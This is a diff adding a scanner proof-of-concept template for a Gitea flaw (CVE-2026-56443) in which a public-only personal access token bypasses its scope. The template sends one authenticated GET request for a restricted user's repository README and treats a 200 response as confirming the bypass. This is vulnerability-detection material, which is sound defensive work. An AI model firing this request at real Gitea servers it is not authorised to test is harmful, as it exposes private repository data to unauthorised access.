@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 Gitea 中 public-only 范围 PAT 在受限可见性用户仓库和包作用域上的权限绕过漏洞"
+id = "POC-AVE-2026-0642"
+name = "Gitea Public-Only PAT Scope Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0642"]
+vuln_id = [
+    "CVE-2026-56443",
+    "AVE-2026-0642",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/repos/limuser/testrepo/readme"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "token {{pat_attacker}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
